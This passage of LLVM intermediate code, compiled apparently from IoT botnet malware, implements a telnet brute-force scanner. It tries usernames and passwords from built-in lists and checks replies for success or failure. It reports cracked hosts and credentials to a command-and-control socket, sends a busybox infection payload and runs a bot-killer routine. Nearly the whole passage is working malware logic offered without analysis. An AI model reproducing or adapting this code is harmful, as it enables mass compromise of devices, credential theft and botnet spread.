  %430 = call i64 @send(i32 noundef %429, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %431 = icmp slt i64 %430, 0
  br i1 %431, label %432, label %436

432:                                              ; preds = %424
  %433 = load i32, i32* %6, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %434
  call void @reset_telstate(%struct.telstate_t* noundef %435)
  br label %889

436:                                              ; preds = %424
  %437 = load i32, i32* %6, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %438
  call void @advance_telstate(%struct.telstate_t* noundef %439, i32 noundef 4)
  br label %888

440:                                              ; preds = %91
  %441 = load i32, i32* %6, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 16
  %446 = load i32, i32* %3, align 4
  %447 = load i32, i32* %6, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 9
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @read_until_response(i32 noundef %445, i32 noundef %446, i8* noundef %451, i32 noundef 1024, i8** noundef getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %453 = icmp ne i32 %452, 0
  br i1 %453, label %454, label %477

454:                                              ; preds = %440
  %455 = call i64 @time(i64* noundef null) #10
  %456 = trunc i64 %455 to i32
  %457 = load i32, i32* %6, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 7
  store i32 %456, i32* %460, align 16
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 9
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @contains_fail(i8* noundef %465)
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %468, label %472

468:                                              ; preds = %454
  %469 = load i32, i32* %6, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %470
  call void @advance_telstate(%struct.telstate_t* noundef %471, i32 noundef 0)
  br label %476

472:                                              ; preds = %454
  %473 = load i32, i32* %6, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %474
  call void @advance_telstate(%struct.telstate_t* noundef %475, i32 noundef 5)
  br label %476

476:                                              ; preds = %472, %468
  br label %889

477:                                              ; preds = %440
  %478 = load i32, i32* %6, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 7
  %482 = load i32, i32* %481, align 16
  %483 = add i32 %482, 7
  %484 = zext i32 %483 to i64
  %485 = call i64 @time(i64* noundef null) #10
  %486 = icmp slt i64 %484, %485
  br i1 %486, label %487, label %491

487:                                              ; preds = %477
  %488 = load i32, i32* %6, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %489
  call void @reset_telstate(%struct.telstate_t* noundef %490)
  br label %491

491:                                              ; preds = %487, %477
  br label %888

492:                                              ; preds = %91
  %493 = load i32, i32* %6, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 0
  %497 = load i32, i32* %496, align 16
  %498 = load i32, i32* %6, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 5
  %502 = load i8, i8* %501, align 1
  %503 = zext i8 %502 to i64
  %504 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %503
  %505 = load i8*, i8** %504, align 8
  %506 = load i32, i32* %6, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 5
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i64
  %512 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %511
  %513 = load i8*, i8** %512, align 8
  %514 = call i64 @strlen(i8* noundef %513) #11
  %515 = call i64 @send(i32 noundef %497, i8* noundef %505, i64 noundef %514, i32 noundef 16384)
  %516 = icmp slt i64 %515, 0
  br i1 %516, label %517, label %521

517:                                              ; preds = %492
  %518 = load i32, i32* %6, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %519
  call void @reset_telstate(%struct.telstate_t* noundef %520)
  br label %889

521:                                              ; preds = %492
  %522 = load i32, i32* %6, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 16
  %527 = call i64 @send(i32 noundef %526, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %528 = icmp slt i64 %527, 0
  br i1 %528, label %529, label %533

529:                                              ; preds = %521
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %531
  call void @reset_telstate(%struct.telstate_t* noundef %532)
  br label %889

533:                                              ; preds = %521
  %534 = load i32, i32* %6, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %535
  call void @advance_telstate(%struct.telstate_t* noundef %536, i32 noundef 6)
  br label %888

537:                                              ; preds = %91
  %538 = load i32, i32* %6, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 16
  %543 = load i32, i32* %3, align 4
  %544 = load i32, i32* %6, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 9
  %548 = load i8*, i8** %547, align 8
  %549 = call i32 @read_until_response(i32 noundef %542, i32 noundef %543, i8* noundef %548, i32 noundef 1024, i8** noundef getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %550 = icmp ne i32 %549, 0
  br i1 %550, label %551, label %622

551:                                              ; preds = %537
  %552 = call i64 @time(i64* noundef null) #10
  %553 = trunc i64 %552 to i32
  %554 = load i32, i32* %6, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 7
  store i32 %553, i32* %557, align 16
  %558 = load i32, i32* %6, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 9
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @contains_fail(i8* noundef %562)
  %564 = icmp ne i32 %563, 0
  br i1 %564, label %565, label %569

565:                                              ; preds = %551
  %566 = load i32, i32* %6, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %567
  call void @advance_telstate(%struct.telstate_t* noundef %568, i32 noundef 0)
  br label %621

569:                                              ; preds = %551
  %570 = load i32, i32* %6, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 9
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @contains_success(i8* noundef %574)
  %576 = icmp ne i32 %575, 0
  br i1 %576, label %577, label %616

577:                                              ; preds = %569
  %578 = load i32, i32* %6, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 3
  %582 = load i8, i8* %581, align 1
  %583 = zext i8 %582 to i32
  %584 = icmp eq i32 %583, 2
  br i1 %584, label %585, label %589

585:                                              ; preds = %577
  %586 = load i32, i32* %6, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %587
  call void @advance_telstate(%struct.telstate_t* noundef %588, i32 noundef 7)
  br label %615

589:                                              ; preds = %577
  %590 = load i32, i32* @mainCommSock, align 4
  %591 = load i32, i32* %6, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %592
  %594 = call i8* @get_telstate_host(%struct.telstate_t* noundef %593)
  %595 = load i32, i32* %6, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 4
  %599 = load i8, i8* %598, align 2
  %600 = zext i8 %599 to i64
  %601 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %600
  %602 = load i8*, i8** %601, align 8
  %603 = load i32, i32* %6, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 5
  %607 = load i8, i8* %606, align 1
  %608 = zext i8 %607 to i64
  %609 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %608
  %610 = load i8*, i8** %609, align 8
  %611 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %590, i8* noundef getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i64 0, i64 0), i8* noundef %594, i8* noundef %602, i8* noundef %610)
  %612 = load i32, i32* %6, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %613
  call void @advance_telstate(%struct.telstate_t* noundef %614, i32 noundef 7)
  br label %615

615:                                              ; preds = %589, %585
  br label %620

616:                                              ; preds = %569
  %617 = load i32, i32* %6, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %618
  call void @reset_telstate(%struct.telstate_t* noundef %619)
  br label %620

620:                                              ; preds = %616, %615
  br label %621

621:                                              ; preds = %620, %565
  br label %889

622:                                              ; preds = %537
  %623 = load i32, i32* %6, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 7
  %627 = load i32, i32* %626, align 16
  %628 = add i32 %627, 7
  %629 = zext i32 %628 to i64
  %630 = call i64 @time(i64* noundef null) #10
  %631 = icmp slt i64 %629, %630
  br i1 %631, label %632, label %636

632:                                              ; preds = %622
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %634
  call void @reset_telstate(%struct.telstate_t* noundef %635)
  br label %636

636:                                              ; preds = %632, %622
  br label %888

637:                                              ; preds = %91
  %638 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %639 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %638, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i64 0, i64 0), i8** noundef getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i64 0, i64 0)) #10
  %640 = load i32, i32* %6, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 16
  %645 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %646 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %647 = call i64 @strlen(i8* noundef %646) #11
  %648 = call i64 @send(i32 noundef %644, i8* noundef %645, i64 noundef %647, i32 noundef 16384)
  %649 = icmp slt i64 %648, 0
  br i1 %649, label %650, label %654

650:                                              ; preds = %637
  %651 = load i32, i32* %6, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %652
  call void @reset_telstate(%struct.telstate_t* noundef %653)
  br label %889

654:                                              ; preds = %637
  call void @RemoveTempDirs()
  %655 = load i32, i32* @mainCommSock, align 4
  %656 = load i32, i32* %6, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %657
  %659 = call i8* @get_telstate_host(%struct.telstate_t* noundef %658)
  %660 = load i32, i32* %6, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 4
  %664 = load i8, i8* %663, align 2
  %665 = zext i8 %664 to i64
  %666 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %665
  %667 = load i8*, i8** %666, align 8
  %668 = load i32, i32* %6, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 5
  %672 = load i8, i8* %671, align 1
  %673 = zext i8 %672 to i64
  %674 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %673
  %675 = load i8*, i8** %674, align 8
  %676 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %655, i8* noundef getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i64 0, i64 0), i8* noundef %659, i8* noundef %667, i8* noundef %675)
  %677 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %678 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %677, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i64 0, i64 0), i8** noundef getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0), i8** noundef getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0)) #10
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 0
  %683 = load i32, i32* %682, align 16
  %684 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %685 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %686 = call i64 @strlen(i8* noundef %685) #11
  %687 = call i64 @send(i32 noundef %683, i8* noundef %684, i64 noundef %686, i32 noundef 16384)
  %688 = icmp slt i64 %687, 0
  br i1 %688, label %689, label %693

689:                                              ; preds = %654
  %690 = load i32, i32* %6, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %691
  call void @reset_telstate(%struct.telstate_t* noundef %692)
  br label %889

693:                                              ; preds = %654
  %694 = load i32, i32* @mainCommSock, align 4
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %696
  %698 = call i8* @get_telstate_host(%struct.telstate_t* noundef %697)
  %699 = load i32, i32* %6, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 4
  %703 = load i8, i8* %702, align 2
  %704 = zext i8 %703 to i64
  %705 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %704
  %706 = load i8*, i8** %705, align 8
  %707 = load i32, i32* %6, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 5
  %711 = load i8, i8* %710, align 1
  %712 = zext i8 %711 to i64
  %713 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %712
  %714 = load i8*, i8** %713, align 8
  %715 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %694, i8* noundef getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i64 0, i64 0), i8* noundef %698, i8* noundef %706, i8* noundef %714)
  %716 = load i32, i32* %6, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %717
  call void @advance_telstate(%struct.telstate_t* noundef %718, i32 noundef 8)
  br label %888

719:                                              ; preds = %91
  %720 = call i64 @time(i64* noundef null) #10
  %721 = trunc i64 %720 to i32
  %722 = load i32, i32* %6, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 7
  store i32 %721, i32* %725, align 16
  %726 = load i32, i32* %6, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 0
  %730 = load i32, i32* %729, align 16
  %731 = call i64 @send(i32 noundef %730, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %732 = icmp slt i64 %731, 0
  br i1 %732, label %733, label %734

733:                                              ; preds = %719
  br label %734

734:                                              ; preds = %733, %719
  %735 = load i32, i32* %6, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 0
  %739 = load i32, i32* %738, align 16
  %740 = call i64 @send(i32 noundef %739, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i64 0, i64 0), i64 noundef 7, i32 noundef 16384)
  %741 = icmp slt i64 %740, 0
  br i1 %741, label %742, label %743

742:                                              ; preds = %734
  br label %743

743:                                              ; preds = %742, %734
  %744 = load i32, i32* %6, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 0
  %748 = load i32, i32* %747, align 16
  %749 = load i8*, i8** @Busybox_Payload, align 8
  %750 = load i8*, i8** @Busybox_Payload, align 8
  %751 = call i64 @strlen(i8* noundef %750) #11
  %752 = call i64 @send(i32 noundef %748, i8* noundef %749, i64 noundef %751, i32 noundef 16384)
  %753 = icmp slt i64 %752, 0
  br i1 %753, label %754, label %758

754:                                              ; preds = %743
  %755 = load i32, i32* %6, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %756
  call void @reset_telstate(%struct.telstate_t* noundef %757)
  br label %889

758:                                              ; preds = %743
  %759 = load i32, i32* @mainCommSock, align 4
  %760 = load i32, i32* %6, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %761
  %763 = call i8* @get_telstate_host(%struct.telstate_t* noundef %762)
  %764 = load i32, i32* %6, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 4
  %768 = load i8, i8* %767, align 2
  %769 = zext i8 %768 to i64
  %770 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %769
  %771 = load i8*, i8** %770, align 8
  %772 = load i32, i32* %6, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 5
  %776 = load i8, i8* %775, align 1
  %777 = zext i8 %776 to i64
  %778 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %777
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %759, i8* noundef getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i64 0, i64 0), i8* noundef %763, i8* noundef %771, i8* noundef %779)
  %781 = load i32, i32* %6, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = load i32, i32* %3, align 4
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 9
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @read_until_response(i32 noundef %785, i32 noundef %786, i8* noundef %791, i32 noundef 1024, i8** noundef bitcast ([7 x i8]* @.str.496 to i8**))
  %793 = icmp ne i32 %792, 0
  br i1 %793, label %794, label %842

794:                                              ; preds = %758
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 9
  %799 = load i8*, i8** %798, align 8
  %800 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* noundef %799, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i64 0, i64 0))
  %801 = icmp ne i32 %800, 0
  br i1 %801, label %802, label %841

802:                                              ; preds = %794
  %803 = load i32, i32* %6, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 3
  %807 = load i8, i8* %806, align 1
  %808 = zext i8 %807 to i32
  %809 = icmp ne i32 %808, 3
  br i1 %809, label %810, label %841

810:                                              ; preds = %802
  %811 = load i32, i32* @mainCommSock, align 4
  %812 = load i32, i32* %6, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 1
  %816 = bitcast i32* %815 to %struct.in_addr*
  %817 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %816, i32 0, i32 0
  %818 = load i32, i32* %817, align 4
  %819 = call i8* @inet_ntoa(i32 %818) #10
  %820 = load i32, i32* %6, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 4
  %824 = load i8, i8* %823, align 2
  %825 = zext i8 %824 to i64
  %826 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %825
  %827 = load i8*, i8** %826, align 8
  %828 = load i32, i32* %6, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 5
  %832 = load i8, i8* %831, align 1
  %833 = zext i8 %832 to i64
  %834 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %833
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %811, i8* noundef getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i64 0, i64 0), i8* noundef %819, i8* noundef %827, i8* noundef %835)
  %837 = load i32, i32* %6, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 3
  store i8 3, i8* %840, align 1
  br label %841

841:                                              ; preds = %810, %802, %794
  br label %842

842:                                              ; preds = %841, %758
  %843 = load i32, i32* %6, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 7
  %847 = load i32, i32* %846, align 16
  %848 = add i32 %847, 10
  %849 = zext i32 %848 to i64
  %850 = call i64 @time(i64* noundef null) #10
  %851 = icmp slt i64 %849, %850
  br i1 %851, label %852, label %887

852:                                              ; preds = %842
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 3
  %857 = load i8, i8* %856, align 1
  %858 = zext i8 %857 to i32
  %859 = icmp ne i32 %858, 3
  br i1 %859, label %860, label %883

860:                                              ; preds = %852
  %861 = load i32, i32* @mainCommSock, align 4
  %862 = load i32, i32* %6, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %863
  %865 = call i8* @get_telstate_host(%struct.telstate_t* noundef %864)
  %866 = load i32, i32* %6, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 4
  %870 = load i8, i8* %869, align 2
  %871 = zext i8 %870 to i64
  %872 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %871
  %873 = load i8*, i8** %872, align 8
  %874 = load i32, i32* %6, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 5
  %878 = load i8, i8* %877, align 1
  %879 = zext i8 %878 to i64
  %880 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %879
  %881 = load i8*, i8** %880, align 8
  %882 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %861, i8* noundef getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i64 0, i64 0), i8* noundef %865, i8* noundef %873, i8* noundef %881)
  br label %883

883:                                              ; preds = %860, %852
  %884 = load i32, i32* %6, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %885
  call void @reset_telstate(%struct.telstate_t* noundef %886)
  br label %887

887:                                              ; preds = %883, %842
  br label %888

888:                                              ; preds = %887, %693, %636, %533, %491, %436, %394, %342, %233, %91
  br label %889

889:                                              ; preds = %888, %754, %689, %650, %621, %529, %517, %476, %432, %420, %379, %323, %319, %198, %167, %154
  %890 = load i32, i32* %6, align 4
  %891 = add nsw i32 %890, 1
  store i32 %891, i32* %6, align 4
  br label %73, !llvm.loop !37

892:                                              ; preds = %73
  br label %71
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #3

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #3

; Function Attrs: nounwind
